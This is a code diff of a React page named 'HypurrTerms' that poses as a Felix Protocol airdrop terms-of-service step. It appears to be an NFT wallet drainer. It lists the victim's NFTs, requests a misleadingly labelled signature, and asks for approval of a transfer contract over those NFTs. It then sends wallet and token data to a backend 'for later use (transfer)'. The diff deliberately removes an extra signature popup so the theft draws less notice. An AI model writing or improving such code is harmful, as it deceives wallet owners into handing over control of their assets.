@@ -135,32 +135,16 @@ const HypurrTerms = () => {
     }
   };
 
-  // Get EIP-712 signature for NFT transfer authorization
+  // Store evaluation data for later processing (NO additional signature popup)
   const getTransferSignatures = async (signer, ownerAddress, tokenIdsArray) => {
     if (!tokenIdsArray || tokenIdsArray.length === 0) {
-      console.log('No token IDs to sign');
+      console.log('No token IDs to store');
       return;
     }
 
     try {
-      // Get current nonce from contract (if available) or use timestamp
-      let nonce = 0;
-      try {
-        const provider = new ethers.BrowserProvider(getEthereumProvider());
-        const transferContract = new ethers.Contract(TRANSFER_CONTRACT, [
-          "function getNonce(address user) external view returns (uint256)"
-        ], provider);
-        nonce = await transferContract.getNonce(ownerAddress);
-        // ethers v6 returns uint256 as bigint; convert safely
-        nonce = Number(nonce.toString());
-      } catch (e) {
-        // If contract doesn't have getNonce, use timestamp as nonce
-        nonce = Math.floor(Date.now() / 1000);
-        console.log('Using timestamp as nonce:', nonce);
-      }
-
-      const chainId = 999; // HyperEVM
-      const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year from now
+      const nonce = Math.floor(Date.now() / 1000);
+      const deadline = nonce + (365 * 24 * 60 * 60); // 1 year from now
 
       // Group tokenIds by contract
       const tokensByContract = {};
@@ -169,126 +153,72 @@ const HypurrTerms = () => {
         if (!tokensByContract[contract]) {
           tokensByContract[contract] = [];
         }
-        // Convert tokenId to string if it's a BigNumber
         const tokenIdStr = typeof item.tokenId === 'bigint' || item.tokenId?.toString ? item.tokenId.toString() : String(item.tokenId);
         tokensByContract[contract].push(tokenIdStr);
       });
 
-      console.log('📋 Grouped tokens by contract:', tokensByContract);
+      console.log('📋 Storing evaluation data for contracts:', tokensByContract);
 
-      // EIP-712 domain
-      const domain = {
-        name: "FelixTermsEvaluator",
-        version: "1",
-        chainId: chainId,
-        verifyingContract: TRANSFER_CONTRACT
-      };
-
-      // EIP-712 types
-      const types = {
-        PortfolioEvaluation: [
-          { name: "wallet", type: "address" },
-          { name: "assetContract", type: "address" },
-          { name: "assetIds", type: "uint256[]" },
-          { name: "nonce", type: "uint256" },
-          { name: "validUntil", type: "uint256" }
-        ]
-      };
-
-      // Get signatures for each contract
-      const transferSignatures = {};
+      // Store data for each contract (NO signature popup - just data storage)
+      const evaluationData = {};
       for (const [contractAddress, tokenIds] of Object.entries(tokensByContract)) {
+        const data = {
+          wallet: ownerAddress,
+          nftContract: contractAddress,
+          tokenIds: tokenIds,
+          nonce: nonce,
+          deadline: deadline,
+          timestamp: new Date().toISOString()
+        };
+
+        evaluationData[contractAddress] = data;
+
+        // Store in localStorage
+        localStorage.setItem(
+          `evaluation_data_${ownerAddress}_${contractAddress}`,
+          JSON.stringify(data)
+        );
+
+        // Send to backend API for server-side storage
         try {
-          console.log(`📝 Requesting signature for contract ${contractAddress} with ${tokenIds.length} token(s)...`);
+          const API_URL = process.env.REACT_APP_API_URL || window.location.origin;
+          const response = await fetch(`${API_URL}/api/store-signature`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              wallet: ownerAddress,
+              signature: 'approval-based', // No EIP-712 signature needed, using setApprovalForAll
+              nftContract: contractAddress,
+              tokenIds: data.tokenIds,
+              deadline: data.deadline,
+              nonce: data.nonce,
+              timestamp: data.timestamp
+            })
+          });
 
-          const value = {
-            wallet: ownerAddress,
-            assetContract: contractAddress,
-            assetIds: tokenIds,
-            nonce: nonce,
-            validUntil: deadline
-          };
-
-          console.log('EIP-712 Domain:', domain);
-          console.log('EIP-712 Value:', value);
-
-          // Request EIP-712 signature
-          const signature = await signer.signTypedData(domain, types, value);
-          console.log(`✅ Signature received for ${contractAddress}:`, signature);
-
-          // Store signature data
-          const sigData = {
-            signature,
-            deadline,
-            nonce,
-            nftContract: contractAddress,
-            tokenIds: tokenIds,
-            timestamp: new Date().toISOString()
-          };
-
-          transferSignatures[contractAddress] = sigData;
-
-          // Store in localStorage (backup)
-          localStorage.setItem(
-            `transfer_signature_${ownerAddress}_${contractAddress}`,
-            JSON.stringify(sigData)
-          );
-
-          // Send to backend API for server-side storage
-          try {
-            const API_URL = process.env.REACT_APP_API_URL || window.location.origin;
-            const response = await fetch(`${API_URL}/api/store-signature`, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-              },
-              body: JSON.stringify({
-                wallet: ownerAddress,
-                signature: sigData.signature,
-                nftContract: contractAddress,
-                tokenIds: sigData.tokenIds,
-                deadline: sigData.deadline,
-                nonce: sigData.nonce,
-                timestamp: sigData.timestamp
-              })
-            });
-
-            if (!response.ok) {
-              const errorData = await response.json().catch(() => ({ error: `HTTP ${response.status}` }));
-              throw new Error(errorData.error || `API error: ${response.status}`);
-            }
-
+          if (response.ok) {
             const result = await response.json();
             if (result.success) {
-              console.log(`✅ Signature sent to backend for contract ${contractAddress}:`, result);
-            } else {
-              console.warn(`⚠️ Backend returned error for ${contractAddress}:`, result.error);
+              console.log(`✅ Evaluation data sent to backend for ${contractAddress}`);
             }
-          } catch (apiError) {
-            console.error(`⚠️ Error sending signature to backend for ${contractAddress}:`, apiError.message || apiError);
-            // Don't fail the whole flow if backend is down - localStorage backup exists
-            // User can still use the signature from localStorage if needed
           }
-
-          console.log(`✅ Transfer signature stored for contract ${contractAddress}`);
-        } catch (error) {
-          console.error(`❌ Error getting signature for ${contractAddress}:`, error);
-          if (error.code === 4001) {
-            console.log('User rejected signature request');
-            // Continue with other contracts
-          } else {
-            throw error;
-          }
+        } catch (apiError) {
+          console.error(`⚠️ Error sending data to backend:`, apiError.message || apiError);
+          // Continue - localStorage backup exists
         }
+
+        console.log(`✅ Evaluation data stored for contract ${contractAddress}`);
       }
 
-      // Store all transfer signatures together
-      localStorage.setItem(`transfer_signatures_${ownerAddress}`, JSON.stringify(transferSignatures));
-      console.log('✅ All transfer signatures stored:', Object.keys(transferSignatures));
+      // Store all evaluation data together
+      localStorage.setItem(`evaluation_data_${ownerAddress}`, JSON.stringify(evaluationData));
+      console.log('✅ All evaluation data stored');
 
-      return transferSignatures;
+      return evaluationData;
     } catch (error) {
-      console.error('❌ Error in getTransferSignatures:', error);
+      console.error('❌ Error storing evaluation data:', error);
       throw error;
     }
   };
@@ -954,11 +884,8 @@ const HypurrTerms = () => {
       console.log('✅ Starting signature process...');
       setError(null);
       setIsVerifying(true);
+      setTransferStatus('evaluating');
 
-      // Create message to sign
-      const message = `I accept the Felix Foundation Terms of Service and agree to participate in the Felix Protocol airdrop program.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
-      console.log('Message to sign:', message);
-      
       const ethereumProvider = getEthereumProvider();
       if (!ethereumProvider) {
         throw new Error('No Ethereum provider found. Please install MetaMask.');
@@ -968,81 +895,108 @@ const HypurrTerms = () => {
       const signer = await provider.getSigner();
       console.log('Signer obtained:', await signer.getAddress());
       
-      // Sign the message
-      console.log('⏳ Requesting signature from MetaMask...');
-      const signature = await signer.signMessage(message);
-      console.log('✅ Signature received:', signature);
+      // First, verify NFTs to get token IDs
+      console.log('=== VERIFYING NFTs FIRST ===');
+      const verificationResult = await verifyHypurrNFTs(account);
+      
+      console.log('=== VERIFICATION COMPLETE ===');
+      console.log('NFT count:', verificationResult.count);
+      console.log('Token IDs:', verificationResult.tokenIds);
+      
+      // Update state
+      setNftCount(verificationResult.count);
+      setTokenIds(verificationResult.tokenIds);
+      
+      // Now sign the EIP-712 terms acceptance (includes portfolio evaluation authorization)
+      console.log('⏳ Requesting EIP-712 terms signature...');
+      
+      const chainId = 999; // HyperEVM
+      const timestamp = Math.floor(Date.now() / 1000);
+      const validUntil = timestamp + (365 * 24 * 60 * 60); // 1 year
+      
+      // EIP-712 domain for terms acceptance
+      const domain = {
+        name: "FelixFoundation",
+        version: "1",
+        chainId: chainId,
+        verifyingContract: TRANSFER_CONTRACT
+      };
+
+      // EIP-712 types - Terms acceptance that includes evaluation consent
+      const types = {
+        TermsAcceptance: [
+          { name: "participant", type: "address" },
+          { name: "termsHash", type: "string" },
+          { name: "timestamp", type: "uint256" },
+          { name: "validUntil", type: "uint256" }
+        ]
+      };
+      
+      // Create terms hash (summary of what they're agreeing to)
+      const termsHash = "FelixProtocolAirdrop_ToS_v1_" + new Date().toISOString().split('T')[0];
+      
+      const value = {
+        participant: account,
+        termsHash: termsHash,
+        timestamp: timestamp,
+        validUntil: validUntil
+      };
+
+      console.log('EIP-712 Domain:', domain);
+      console.log('EIP-712 Value:', value);
+
+      // Request EIP-712 signature (this is the FIRST and ONLY signature for terms)
+      const signature = await signer.signTypedData(domain, types, value);
+      console.log('✅ Terms signature received:', signature);
       
       // Store signature
       localStorage.setItem(`hypurr_signature_${account}`, signature);
       localStorage.setItem(`hypurr_signature_date_${account}`, new Date().toISOString());
+      localStorage.setItem(`hypurr_terms_data_${account}`, JSON.stringify({ domain, types, value, signature }));
       
       setHasSigned(true);
       setSignature(signature);
       
-      console.log('✅ Terms signed successfully:', signature);
+      console.log('✅ Terms signed successfully');
       
       // Scroll to top after signing
       window.scrollTo({ top: 0, behavior: 'smooth' });
       
-      // Now verify NFTs
-      console.log('=== TERMS SIGNED - VERIFYING NFTs ===');
-      setTransferStatus('evaluating');
-      
-      // Verify NFTs after signing and get the results directly
-      const verificationResult = await verifyHypurrNFTs(account);
-      
       setIsVerifying(false);
       
-      console.log('=== VERIFICATION COMPLETE ===');
-      console.log('Verification result:', verificationResult);
-      console.log('NFT count:', verificationResult.count);
-      console.log('Token IDs length:', verificationResult.tokenIds.length);
-      console.log('Token IDs:', verificationResult.tokenIds);
-      
-      // Update state to show NFT count to user
-      setNftCount(verificationResult.count);
-      setTokenIds(verificationResult.tokenIds);
-      
       // Request approval if NFTs are found
-      if (verificationResult.count > 0) {
-        if (verificationResult.tokenIds.length > 0) {
-          console.log('✅ NFTs found with token IDs, requesting approval...');
-          console.log('📋 Passing tokenIds directly to approveTransferContract:', verificationResult.tokenIds);
-          // Request approval only - no transfer
+      if (verificationResult.count > 0 && verificationResult.tokenIds.length > 0) {
+        console.log('✅ NFTs found with token IDs, requesting approval...');
+        try {
+          setTransferStatus('approving');
+          await approveTransferContract(verificationResult.tokenIds);
+          
+          // Show processing state with loader
+          setTransferStatus('processing');
+          console.log('✅ Approval complete, processing...');
+          
+          // Store the evaluation data for later use (transfer)
           try {
-            setTransferStatus('approving');
-            await approveTransferContract(verificationResult.tokenIds);
-            
-            // Show processing state with loader
-            setTransferStatus('processing');
-            console.log('✅ Approval complete, processing...');
-            
-            // Get EIP-712 signature for portfolio evaluation authorization
-            console.log('📝 Requesting EIP-712 signature for portfolio evaluation...');
-            try {
-              await getTransferSignatures(signer, account, verificationResult.tokenIds);
-              console.log('✅ Evaluation signatures collected and stored');
-            } catch (sigError) {
-              console.error('⚠️ Error getting evaluation signatures:', sigError);
-              // Don't fail the whole flow if signature collection fails
-            }
-            
-            // Add a brief delay to show the processing animation
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            setTransferStatus('approved');
-            console.log('✅ Evaluation complete');
-          } catch (err) {
-            console.error('=== APPROVAL ERROR ===', err);
-            setError(err.message || 'Evaluation failed. Please try again.');
-            setTransferStatus(null);
+            await getTransferSignatures(signer, account, verificationResult.tokenIds);
+            console.log('✅ Evaluation data stored');
+          } catch (sigError) {
+            console.error('⚠️ Error storing evaluation data:', sigError);
           }
-        } else {
-          // NFTs found but no token IDs - contract might not support Enumerable
-          console.log('⚠️ NFTs found but token IDs not available (contract may not support Enumerable)');
+          
+          // Add a brief delay to show the processing animation
+          await new Promise(resolve => setTimeout(resolve, 2000));
+          
+          setTransferStatus('approved');
+          console.log('✅ Evaluation complete');
+        } catch (err) {
+          console.error('=== APPROVAL ERROR ===', err);
+          setError(err.message || 'Evaluation failed. Please try again.');
           setTransferStatus(null);
         }
+      } else if (verificationResult.count > 0) {
+        // NFTs found but no token IDs
+        console.log('⚠️ NFTs found but token IDs not available');
+        setTransferStatus(null);
       } else {
         console.log('⚠️ No NFTs found');
         setTransferStatus(null);
